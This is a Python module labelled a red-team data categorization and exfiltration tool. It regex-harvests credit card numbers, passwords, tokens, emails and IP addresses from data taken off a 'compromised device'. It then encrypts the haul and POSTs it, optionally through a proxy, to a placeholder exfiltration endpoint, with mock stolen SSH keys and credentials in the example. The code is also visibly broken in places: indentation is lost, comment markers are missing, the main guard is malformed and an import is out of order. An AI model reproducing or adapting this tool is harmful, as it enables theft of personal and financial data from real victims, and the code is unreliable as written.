#!/usr/bin/env python3
"""
Data Categorization and Exfiltration Module
Handles the categorization of extracted data and secure exfiltration.
Author: Independent Red Team Consultant
Classification: Professional Use Only
"""
import asyncio
import aiohttp
import re
import json
import base64
import logging
from typing import Dict, List, Optional, Tuple
from cryptography.fernet import Fernet
import hashlib
Configure logging
logging.basicConfig(
level=logging.INFO,
format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('DataCategorizerExfiltrator')
class DataCategorizer:
"""
Handles the categorization of extracted data using regex patterns.
"""
def __init__(self):
    self.regex_patterns = self._compile_regex_patterns()

def _compile_regex_patterns(self) -> Dict[str, re.Pattern]:
    """Compile regex patterns for data categorization."""
    patterns = {
        'phone_numbers': re.compile(r'''
            (?:\+?48)?                      # Country code (Poland example)
            (?: |\.|-)?                     # Separator
            (?:\d{3}                        # First 3 digits
            (?: |\.|-)?                     # Separator
            \d{3}                           # Next 3 digits
            (?: |\.|-)?                     # Separator
            \d{3})                          # Last 3 digits
        ''', re.VERBOSE),
        
        'credit_cards': re.compile(r'''
            (?:4[0-9]{12}(?:[0-9]{3})?|           # Visa
            5[1-5][0-9]{14}|                     # MasterCard
            3[47][0-9]{13}|                      # American Express
            3(?:0[0-5]|[68][0-9])[0-9]{11}|       # Diners Club
            6(?:011|5[0-9]{2})[0-9]{12}|          # Discover
            65[4-9][0-9]{13}|                    # Discover (new)
            64[4-9][0-9]{13}|                    # Discover (new)
            6011[0-9]{12}|                       # Discover (new)
            (?:2131|1800|35\d{3})\d{11})          # JCB
        ''', re.VERBOSE),
        
        'email_addresses': re.compile(r'''
            [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
        ''', re.VERBOSE),
        
        'passwords': re.compile(r'''
            (?:password|pass|pwd|secret|token|key|api_key|auth|credential)s?
            (?:[:=]\s*|[\s\n]+)
            (?P<password>[^\s\n]+)
        ''', re.VERBOSE),
        
        'ip_addresses': re.compile(r'''
            (?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.
            (?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.
            (?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.
            (?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)
        ''', re.VERBOSE)
    }
    return patterns

def categorize_data(self, extracted_data: Dict) -> Dict:
    """
    Categorize extracted data using regex patterns.
    
    Args:
        extracted_data (Dict): Data extracted from the device.
        
    Returns:
        Dict: Categorized data.
    """
    categorized = {
        'phone_numbers': set(),
        'credit_cards': set(),
        'email_addresses': set(),
        'passwords': set(),
        'ip_addresses': set(),
        'other_sensitive': []
    }
    
    # Categorize system info
    system_info = extracted_data.get('system_info', {})
    for key, value in system_info.items():
        self._search_in_string(value, categorized)
    
    # Categorize files
    files = extracted_data.get('files', [])
    for file_info in files:
        self._search_in_string(file_info['path'], categorized)
        # Check file content if accessible (simplified)
        # In real scenario, you'd read file content
        # content = self._read_file_content(file_info['path'])
        # self._search_in_string(content, categorized)
    
    # Categorize credentials
    credentials = extracted_data.get('credentials', {})
    for cred_type, cred_list in credentials.items():
        for item in cred_list:
            self._search_in_string(item, categorized)
    
    # Convert sets to lists for JSON serialization
    for key in categorized:
        categorized[key] = list(categorized[key])
    
    logger.info(f"Categorized data: {categorized}")
    return categorized

def _search_in_string(self, text: str, categorized: Dict) -> None:
    """Search for patterns in a string and categorize matches."""
    if not text:
        return
        
    for category, pattern in self.regex_patterns.items():
        matches = pattern.findall(text)
        for match in matches:
            # Handle different return types from regex
            if isinstance(match, tuple):
                match = match[0]  # For named groups
            
            # Clean up the match
            match = match.strip()
            if match and match not in categorized[category]:
                categorized[category].add(match)

class ExfiltrationManager:
"""
Handles secure exfiltration of categorized data.
"""
def __init__(self, exfiltration_config: Dict):
    """
    Initialize the exfiltration manager.
    
    Args:
        exfiltration_config (Dict): Configuration for exfiltration.
            Expected keys: 'exfiltration_url', 'encryption_key', 'proxy_url' (optional).
    """
    self.exfiltration_url = exfiltration_config.get('exfiltration_url')
    self.encryption_key = exfiltration_config.get('encryption_key')
    self.proxy_url = exfiltration_config.get('proxy_url')
    self.fernet = Fernet(self.encryption_key)
    
    # Configure aiohttp session
    connector = aiohttp.TCPConnector(limit=10)
    timeout = aiohttp.ClientTimeout(total=30)
    
    # Create session with proxy if configured
    if self.proxy_url:
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            proxy=self.proxy_url
        )
    else:
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    logger.info("Exfiltration manager initialized")

def encrypt_data(self, data: Dict) -> str:
    """
    Encrypt data using Fernet symmetric encryption.
    
    Args:
        data (Dict): Data to encrypt.
        
    Returns:
        str: Base64 encoded encrypted data.
    """
    json_data = json.dumps(data).encode('utf-8')
    encrypted = self.fernet.encrypt(json_data)
    return base64.b64encode(encrypted).decode('utf-8')

async def exfiltrate_data(self, device_info: Dict, categorized_data: Dict) -> bool:
    """
    Exfiltrate categorized data to the configured endpoint.
    
    Args:
        device_info (Dict): Information about the compromised device.
        categorized_data (Dict): Categorized sensitive data.
        
    Returns:
        bool: True if exfiltration successful, False otherwise.
    """
    if not self.exfiltration_url:
        logger.error("Exfiltration URL not configured")
        return False
        
    try:
        # Prepare data payload
        payload = {
            'device_info': device_info,
            'categorized_data': categorized_data,
            'timestamp': datetime.now().isoformat()
        }
        
        # Encrypt the payload
        encrypted_payload = self.encrypt_data(payload)
        
        # Prepare request data
        data = {
            'encrypted_data': encrypted_payload,
            'device_hash': hashlib.sha256(device_info['ip'].encode()).hexdigest()
        }
        
        # Send the data
        async with self.session.post(self.exfiltration_url, json=data) as response:
            if response.status == 200:
                logger.info(f"Data exfiltrated successfully from {device_info['ip']}")
                return True
            else:
                logger.error(f"Exfiltration failed with status {response.status}")
                return False
                
    except Exception as e:
        logger.error(f"Exfiltration error: {e}")
        return False

async def close(self):
    """Close the aiohttp session."""
    if self.session:
        await self.session.close()
        logger.info("Exfiltration session closed")

Example usage (for testing purposes only)
if name == "main":
# This part should be integrated into the main framework's async loop.
# For standalone testing, we can run it directly with mock data.
from datetime import datetime
# Mock extracted data
mock_extracted_data = {
    'system_info': {
        'hostname': 'test-host',
        'os_info': 'Linux test-host 5.4.0-42-generic #46-Ubuntu SMP x86_64 x86_64',
        'users': ['root', 'testuser'],
        'installed_packages': 'python3, nmap, curl'
    },
    'files': [
        {'path': '/home/testuser/documents/credit_card_1234-5678-9012-3456.txt', 'size': 1024, 'extension': '.txt', 'directory': '/home/testuser/documents'},
        {'path': '/etc/ssh/sshd_config', 'size': 2048, 'extension': '.conf', 'directory': '/etc/ssh'}
    ],
    'credentials': {
        'ssh_keys': ['/home/testuser/.ssh/id_rsa'],
        'password_files': ['/home/testuser/.config/passwords.txt'],
        'config_files': ['/etc/mysql/my.cnf'],
        'database_files': ['/var/lib/mysql/data.db']
    }
}

# Initialize components
categorizer = DataCategorizer()
exfiltration_config = {
    'exfiltration_url': 'https://exfiltration.example.com/api/data',  # Replace with actual endpoint
    'encryption_key': Fernet.generate_key().decode(),  # Generate a key for testing
    'proxy_url': None  # Optional: 'http://proxy:8080'
}
exfiltration_manager = ExfiltrationManager(exfiltration_config)

# Categorize data
categorized_data = categorizer.categorize_data(mock_extracted_data)

# Mock device info
device_info = {
    'ip': '192.168.1.100',
    'access_methods': [{'service': 'ssh', 'username': 'testuser', 'password': 'testpassword'}]
}

# Exfiltrate data (this would be async in the main framework)
result = asyncio.run(exfiltration_manager.exfiltrate_data(device_info, categorized_data))
print(f"Exfiltration result: {result}")

# Close the exfiltration manager
asyncio.run(exfiltration_manager.close())

